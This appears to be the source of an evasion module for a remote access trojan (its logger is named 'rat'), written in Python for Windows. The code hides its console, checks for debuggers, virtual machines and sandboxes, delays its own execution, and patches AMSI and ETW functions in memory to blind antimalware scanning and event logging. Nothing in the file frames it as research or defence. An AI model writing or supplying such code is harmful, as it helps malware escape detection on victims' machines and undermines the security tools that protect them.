import os
import sys
import time
import random
import socket
import ctypes
import psutil
import logging
from ctypes import wintypes

log = logging.getLogger("rat")

CREATE_NO_WINDOW = 0x08000000

def hide_console() -> None:
    try:
        hwnd = ctypes.windll.kernel32.GetConsoleWindow()
        if hwnd:
            ctypes.windll.user32.ShowWindow(hwnd, 0)
    except Exception:
        pass

def is_debugger_present() -> bool:
    try:
        if ctypes.windll.kernel32.IsDebuggerPresent():
            return True
        is_remote = ctypes.c_bool(False)
        ctypes.windll.kernel32.CheckRemoteDebuggerPresent(
            ctypes.windll.kernel32.GetCurrentProcess(),
            ctypes.byref(is_remote)
        )
        if is_remote.value:
            return True
    except Exception:
        pass
    return False

def check_vm_artifacts() -> bool:
    vm_procs = (
        "vmtoolsd.exe", "vmwaretray.exe", "vboxservice.exe", "vboxtray.exe",
        "qemu-ga.exe", "prl_tools.exe", "xenservice.exe"
    )
    try:
        for p in psutil.process_iter(['name']):
            name = (p.info['name'] or "").lower()
            if any(vm in name for vm in vm_procs):
                return True
    except Exception:
        pass
    vm_files = [
        r"C:\Windows\System32\drivers\vmmouse.sys",
        r"C:\Windows\System32\drivers\vmhgfs.sys",
        r"C:\Windows\System32\drivers\VBoxMouse.sys",
        r"C:\Windows\System32\drivers\VBoxGuest.sys",
        r"C:\Windows\System32\drivers\VBoxSF.sys",
    ]
    for f in vm_files:
        if os.path.exists(f):
            return True
    return False

def sandbox_check() -> bool:
    if is_debugger_present():
        return True
    try:
        if len(list(psutil.process_iter())) < 40:
            return True
    except Exception:
        pass
    bad = ("vmware", "virtualbox", "vbox", "qemu", "xen", "sandbox", "sample", "cuckoo")
    try:
        host = socket.gethostname().lower()
        user = os.getlogin().lower()
        if any(x in host or x in user for x in bad):
            return True
    except Exception:
        pass
    try:
        if psutil.cpu_count() < 2 or psutil.virtual_memory().total < 1.5 * 1024**3:
            return True
    except Exception:
        pass
    if check_vm_artifacts():
        return True
    return False

def _patch_mem(addr, data: bytes) -> bool:
    try:
        old = ctypes.c_ulong()
        if not ctypes.windll.kernel32.VirtualProtect(addr, len(data), 0x40, ctypes.byref(old)):
            return False
        ctypes.memmove(addr, data, len(data))
        ctypes.windll.kernel32.VirtualProtect(addr, len(data), old.value, ctypes.byref(old))
        return True
    except Exception:
        return False

def patch_amsi_etw() -> None:
    try:
        k32 = ctypes.windll.kernel32
        ntdll = k32.LoadLibraryW("ntdll.dll")
        etw = k32.GetProcAddress(ntdll, b"EtwEventWrite")
        if etw:
            _patch_mem(etw, b"\xC3")
        amsi = k32.LoadLibraryW("amsi.dll")
        if amsi:
            for name in (b"AmsiScanBuffer", b"AmsiScanString"):
                addr = k32.GetProcAddress(amsi, name)
                if addr:
                    _patch_mem(addr, b"\xB8\x57\x00\x07\x80\xC3")
            opensess = k32.GetProcAddress(amsi, b"AmsiOpenSession")
            if opensess:
                _patch_mem(opensess, b"\xC3")
    except Exception as e:
        log.debug("patch_amsi_etw: %s", e)

def startup_delay() -> None:
    time.sleep(random.randint(8, 20))

def anti_analysis() -> None:
    hide_console()
    startup_delay()
    if sandbox_check():
        log.warning("sandbox indicators detected, extra delay")
        time.sleep(random.randint(30, 90))
    patch_amsi_etw()
